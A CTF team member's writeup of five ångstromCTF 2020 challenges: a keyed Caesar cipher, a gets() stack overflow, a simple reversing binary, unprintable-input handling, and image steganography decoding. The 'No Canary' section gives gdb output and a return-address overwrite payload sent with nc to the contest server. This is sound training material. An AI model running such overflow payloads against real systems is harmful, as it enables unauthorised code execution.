# ångstromCTF 2020
![ångstromCTF 2020](angstromCTF2020.png)

ångstromCTF 2020 was really a great competition and we as [**P1rates**](https://2020.angstromctf.com/teams/6525) team enjoyed it and learned a lot, I participated as **T1m3-m4ch1n3** and Here's my writeup about what i solved.

## Challenges

| Title                              | Category                        | Score |
| ---------------------------------- |:-------------------------------:| -----:|
|    [Keysar](#Keysar)               |   Crypto                        | 40    |
|    [No Canary](#no-canary)         |   Binary Exploitation           | 50    |
|    [Revving Up](#revving-up)       |   Reversing                     | 50    |
|    [Inputter](#inputter)           |   Misc                          | 100   |
|    [msd](#msd)                     |   Misc                          | 140   |

---

## Keysar
#### Crypto (40 points)


### Description:
> **Hey! My friend sent me a message... He said encrypted it with the key ANGSTROMCTF.<br>
> He mumbled what cipher he used, but I think I have a clue.<br>
> Gotta go though, I have history homework!!<br>
> agqr{yue_stdcgciup_padas}**

> *Hint: Keyed caesar, does that even exist??*

### solution:

Well, as it's obvious from the title it has something to do with "Ceaser Cipher" and as the hint says "Keyed Ceaser" so i used this [site](http://rumkin.com/tools/cipher/caesar-keyed.php) to decrypt the flag given the key provided and BOOM! we got the flag!

Flag: ``` actf{yum_delicious_salad} ```

---

## No Canary
#### Binary Exploitation (50 points)


### Description:
> **Agriculture is the most healthful, most useful and most noble employment of man.<br>
> —George Washington<br><br>
> Can you call the flag function in this [program](No%20Canary/no_canary) ([source](No%20Canary/no_canary.c))? Try it out on the shell server at /problems/2020/no_canary or by connecting with nc shell.actf.co 20700.**

> *Hint: What's dangerous about the gets function?*

### solution:

The answer for the hint is simple .. It's "overflow"! .. gets function doesn't restrict the user input length and hence we can make an overflow given the address of flag() function to read the flag.txt!

So to get the address of flag() function we will use gdb
```
$ gdb no_canary
(gdb) set disassembly-flavor intel
(gdb) info func
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  setresgid@plt
0x0000000000401050  system@plt
0x0000000000401060  printf@plt
0x0000000000401070  gets@plt
0x0000000000401080  getegid@plt
0x0000000000401090  setvbuf@plt
0x00000000004010a0  _start
0x00000000004010d0  _dl_relocate_static_pie
0x00000000004010e0  deregister_tm_clones
0x0000000000401110  register_tm_clones
0x0000000000401150  __do_global_dtors_aux
0x0000000000401180  frame_dummy
0x0000000000401186  flag
0x0000000000401199  main
0x00000000004012e0  __libc_csu_init
0x0000000000401350  __libc_csu_fini
0x0000000000401358  _fini
```

Nice! we got the address **0x00401186** .. Now we know that name variable is of size 20 so we need a payload > 20 to reach to rip register and put the address of flag() function in there.

We need to see the main function:
```
(gdb) disas main
   .
   .
   0x00000000004012ba <+289>:	call   0x401070 <gets@plt>
   0x00000000004012bf <+294>:	lea    rax,[rbp-0x20]
   .
   .
```
And then setting a breakpoint at **0x004012bf** right after call gets() function instruction:
```
(gdb) b *0x004012bf
```
We'll run the program using a payload of 20 "A"s letter:
```
(gdb) r <<< $(python -c "print 'A' * 20")
```
Now we hit the breakpoint, We also need to know the saved rip register value so we can detect it on the stack and optimize our payload to target it:
```
(gdb) info frame
Stack level 0, frame at 0x7fffffffe590:
 rip = 0x4012bf in main; saved rip = 0x7ffff7a5a2e1
.
.
```
So our target is **0x7ffff7a5a2e1** .. Now by examining the stack:
```
(gdb) x/100x $rsp
0x7fffffffe560:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe570:	0x41414141	0x00007f00	0x00000000	0x00002af8
0x7fffffffe580:	.0x004012e0	0x00000000	0xf7a5a2e1	0x00007fff
.
.
```
It's so clear that **0xf7a5a2e1	0x00007fff** is the saved rip register in little-endian and if we can replace it with the flag() function address which is **0x0000000000401186** we can change the flow of the program to print the flag!

so our final payload will be:
```
(gdb) r <<< $(python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00'")
```
That was locally, and by applying it to **nc shell.actf.co 20700** it should give us the flag:
```
$ python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00' | nc shell.actf.co 20700
```

Flag: ``` actf{that_gosh_darn_canary_got_me_pwned!} ```

---

## Revving Up
#### Reversing (50 points)

### Description:
> **Clam wrote a [program](Revving%20Up/revving_up) for his school's cybersecurity club's first rev lecture!<br>
> Can you get it to give you the flag?<br>
> You can find it at /problems/2020/revving_up on the shell server, which you can access via the "shell" link at the top of the site.**

> *Hint: Try some google searches for "how to run a file in linux" or "bash for beginners".*

### solution:
We go to the shell server and to the directory given we'll find 2 files flag.txt and revving_up And by: ```bash $ file revving_up ``` we know that it's ELF 64-bit and by running it:
```
$ ./revving_up
Congratulations on running the binary!
Now there are a few more things to tend to.
Please type "give flag" (without the quotes).

```
After we type "give flag":
```
give flag
Good job!
Now run the program with a command line argument of "banana" and you'll be done!
```
So we do as it's said:
```
$ ./revving_up banana
Congratulations on running the binary!
Now there are a few more things to tend to.
Please type "give flag" (without the quotes).
give flag
Good job!
Well I think it's about time you got the flag!
actf{g3tting_4_h4ng_0f_l1nux_4nd_b4sh}
```
So easy, right ?!!

Flag: ``` actf{g3tting_4_h4ng_0f_l1nux_4nd_b4sh} ```

---

## Inputter
#### Misc (100 points)

### Description:
> **Clam really likes challenging himself. When he learned about all these weird unprintable ASCII characters he just HAD to put it in [a challenge](Inputter/inputter). Can you satisfy his knack for strange and hard-to-input characters? [Source](Inputter/inputter.c).<br>
> Find it on the shell server at /problems/2020/inputter/.**

> *Hint: There are ways to run programs without using the shell.*

### solution:
By looking at the source we find interesting conditions:
```c
int main(int argc, char* argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc != 2) {
        puts("Your argument count isn't right.");
        return 1;
    }
    if (strcmp(argv[1], " \n'\"\x07")) {
        puts("Your argument isn't right.");
        return 1;
    }
    char buf[128];
    fgets(buf, 128, stdin);
    if (strcmp(buf, "\x00\x01\x02\x03\n")) {
        puts("Your input isn't right.");
        return 1;
    }
    puts("You seem to know what you're doing.");
    print_flag();
}
```
So now we know that:
1. There's an argument we must provide when running the file
2. The argument value must be ```" \n'\"\x07"``` *(without the quotes)*
3. There's an input of value ```"\x00\x01\x02\x03\n"``` *(without the quotes)*

I encoded the argument to hex so it became: ``` \x20\x0a\x27\x22\x07 ```*(the backslash \ before " is just to escape the character in the C source)* .. I tried many methods but the easier one to pass this value as argument is using the ```$''``` quote style .. for the input we can use either ``` echo -e ``` or ``` printf ``` the both commands do the same job .. now our full command is:
```bash
$ printf '\x00\x01\x02\x03\n' | ./inputter $'\x20\x0a\x27\x22\x07'
You seem to know what you're doing.
actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions}
```

Flag: ``` actf{impr4ctic4l_pr0blems_c4ll_f0r_impr4ctic4l_s0lutions} ```

---


## msd
#### Misc (140 points)

### Description:
> **You thought Angstrom would have a stereotypical LSB challenge... You were wrong! To spice it up, we're now using the [Most Significant Digit](msb/public.py). Can you still power through it?<br><br>
Here's the [encoded image](msb/output.png), and here's the [original image](msb/breathe.jpg), for the... well, you'll see.<br><br>
Important: Don't use Python 3.8, use an older version of Python 3!
**

> *Hint: Look at the difference between the original and what I created!<br>
> Also, which way does LSB work?*

### solution:
Nice, so before anything .. we have an original photo ```breathe.jpg``` that has been encoded to ```output.png``` using ```public.py``` script

Now we need to understand this script:
```python
from PIL import Image

im = Image.open('breathe.jpg')
im2 = Image.open("breathe.jpg")

width, height = im.size

flag = "REDACT"
flag = ''.join([str(ord(i)) for i in flag])


def encode(i, d):
    i = list(str(i))
    i[0] = d

    return int(''.join(i))
    

c = 0

for j in range(height):
    for i in range(width):
        data = []
        for a in im.getpixel((i,j)):
            data.append(encode(a, flag[c % len(flag)]))

            c+=1

        im.putpixel((i,j), tuple(data))
        
im.save("output.png")
pixels = im.load()
```

By reading the script provided we conclude:
1. flag variable has the decimal values of the characters of the flag ```(ex: "abc" -> "979899")```
2. the for loop reads the pixels from top to bottom for each column in the photo starting from top left
3. the first pixel in the photo it's first digit from the left "MSB" is replaced with the first digit from the left in the flag variable and the second pixel with the second digit in the flag, etc.. until the flag decimal values ends and then it starts over from the beggining of the flag, etc..

So if the pixel is ``` 104 ``` and the digit from flag decimal representition is ```2``` the pixel becomes ``` 204 ``` 
But there's a problem .. if the digit is 9 the pixel can not be ``` 904 ``` because the most value that can be stored to the pixel is ```255``` so in this case this digit is lost ...

So the reversing of the code will be as follows:
1. read the pixels of ``` output.png ```and ``` breathe.jpg ``` in the same direction as in the encryption process
2. for each corresponding pixels compare the pixel of ```output.png``` with the pixel of ``` breathe.jpg ```
   - if the 2 pixels have the same length AND the encrypted pixel is not equal 255, then get the first digit from left of the encrypted pixel (ex: 104, 204 -> 2)
   - if the length of the encrypted pixel is less than the length of the original pixel, then put a zero (ex: 123, 23 -> 0)
   - else then it's a lost digit and put 'x' to recognize it

I wrote a script that can iterate through the whole image and do this decryption process:

```python
from PIL import Image

imorg = Image.open("breathe.jpg")
im = Image.open('output.png')

width, height = im.size

def getchar(a, b):
    char = []

    for i in range(0, 3):
        
        x = list(str(a[i]))
        y = list(str(b[i]))
        if len(x) == len(y) and b[i] != 255:
            char.append(y[0])
        elif len(y) < len(x):
            char.append('0')
        else:
            char.append('x')
        
    return ''.join(char)

all = ''

for j in range(height):
    for i in range(width):
        
        all += getchar(imorg.getpixel((i, j)), im.getpixel((i, j)))

# since we know the first 5 letters of the flag "actf{" -> "9799116102123"
pos = all.find('9799116102123')
print(all[pos:pos+100])
```

Now be running it:
```bash
$ python3 decrypt.py
9799116102123105110104971081019510112010497108101951011221121224549505148579810x10x103121104xxxx1x11
```
I used this site to decrypt the result after seperating the digits manually and the result was ``` actf{inhale_exhale_ezpz-12309b ``` .. it seems we got part of the flag but there are lost bits .. so i edited the last couple of lines in python to print the next occurence of the flag
```python
pos = all.find('9799116102123')
posnext = all.find('9799116', pos+1)
print(all[posnext:posnext+100])
```
And by running again:
```bash
$ python3 decrypt.py
9799116102123105110104971081019510112010497108101951011221121224549505148579810510310312110497981211
```
Great! There are no lost bits .. no decypting again using the same site and yeah, we got the flag!
Flag: ``` actf{inhale_exhale_ezpz-12309biggyhaby} ```
